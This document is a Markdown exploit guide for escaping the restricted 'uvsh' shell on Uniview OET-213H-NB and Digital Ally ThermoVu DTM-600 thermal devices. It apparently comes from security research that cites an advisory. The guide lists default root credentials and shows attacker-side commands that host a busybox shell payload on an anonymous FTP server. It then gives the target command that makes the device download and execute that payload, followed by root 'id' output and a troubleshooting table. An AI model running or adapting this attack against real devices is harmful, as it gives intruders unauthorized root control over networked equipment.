# uvsh Restricted Shell Escape via FTP

**Target:** Uniview OET-213H-NB / Digital Ally ThermoVu DTM-600
**Prerequisite:** Access to restricted `uvsh` shell (root/123456)

---

## Overview

The `updatecpld` command fetches and executes arbitrary code from an attacker-controlled FTP server, bypassing the restricted shell.

```
updatecpld <IP>
    → ftpget anonymous@<IP>/cpldload
    → chmod +x cpldload
    → ./cpldload  (arbitrary code execution)
```

---

## Setup (Attacker Machine)

Run these commands on your attack box (e.g., 192.168.30.13):

```bash
# Create the payload directory and file
mkdir -p /tmp/ftp
cat > /tmp/ftp/cpldload << 'EOF'
#!/bin/sh
/bin/busybox sh
EOF
chmod +x /tmp/ftp/cpldload

# Start FTP server (anonymous access)
cd /tmp/ftp && python3 -m pyftpdlib -p 21 -w
```

Verify pyftpdlib is running and `cpldload` is in the FTP root.

---

## Exploitation (Target Device)

From the restricted uvsh shell:

```
User@/root> updatecpld 192.168.30.13
```

Result: Full unrestricted BusyBox ash shell with root privileges.

```
root@root:~$ id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Troubleshooting

| Error | Cause | Fix |
|-------|-------|-----|
| `550 No such file or directory` | cpldload not in FTP root | Verify file exists in `/tmp/ftp/` |
| Connection refused | FTP server not running | Start pyftpdlib on port 21 |
| Connection timeout | Firewall blocking | Allow inbound TCP 21 |
| `ftpget: can't connect` | Wrong IP | Verify attacker IP is reachable from target |

---

## Dependencies

- `pyftpdlib`: `pip install pyftpdlib`

---

## References

- Finding 3 in `telnet-findings.md`
- SSD Advisory: Uniview IPC2322LB Auth Bypass and CLI Escape
